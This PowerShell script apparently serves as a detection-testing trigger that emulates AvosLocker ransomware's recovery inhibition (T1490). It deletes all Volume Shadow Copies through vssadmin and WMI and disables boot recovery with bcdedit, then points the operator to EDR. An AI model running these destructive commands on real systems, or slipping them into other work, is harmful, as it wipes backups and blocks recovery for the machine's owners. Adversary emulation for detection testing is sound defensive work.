<#
.SYNOPSIS
    AvosLocker Shadow Copy Deletion - DETECTION TRIGGER
.DESCRIPTION
    Deletes Volume Shadow Copies using vssadmin.
    TTP: T1490
#>
$ErrorActionPreference = "SilentlyContinue"
Write-Host "[*] Starting AvosLocker Shadow Copy Deletion (T1490)" -ForegroundColor Cyan

$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Host "[!] WARNING: Not running as Administrator - shadow deletion will fail" -ForegroundColor Red
}

# Step 1: Enumerate existing shadows
Write-Host "`n[*] Enumerating Volume Shadow Copies..."
Write-Host "    CMD: vssadmin list shadows"
$shadowList = vssadmin list shadows 2>&1
$shadowList | ForEach-Object { Write-Host "    $_" }

# Step 2: Delete all shadows via vssadmin
Write-Host "`n[*] [T1490] Deleting all shadow copies..."
Write-Host "    CMD: vssadmin delete shadows /all /quiet"
vssadmin delete shadows /all /quiet 2>&1

# Step 3: Also try via WMI (backup method)
Write-Host "`n[*] [T1490] Attempting WMI shadow deletion..."
Write-Host "    CMD: Get-WmiObject Win32_Shadowcopy | ForEach Delete"
$shadows = Get-WmiObject Win32_Shadowcopy -ErrorAction SilentlyContinue
if ($shadows) {
    foreach ($s in $shadows) {
        try {
            $s.Delete()
            Write-Host "    [+] WMI Deleted: $($s.ID)" -ForegroundColor Green
        } catch {
            Write-Host "    [-] WMI delete failed: $_" -ForegroundColor Red
        }
    }
} else {
    Write-Host "    [-] No shadow copies found via WMI" -ForegroundColor Gray
}

# Step 4: Disable recovery via bcdedit
Write-Host "`n[*] [T1490] Disabling boot recovery..."
Write-Host "    CMD: bcdedit /set {default} recoveryenabled No"
bcdedit /set "{default}" recoveryenabled No 2>&1

Write-Host "`n[+] Shadow Copy Deletion Complete." -ForegroundColor Green
Write-Host "[!] Check EDR for: vssadmin shadow delete, WMI shadow removal, bcdedit recovery disable" -ForegroundColor Magenta
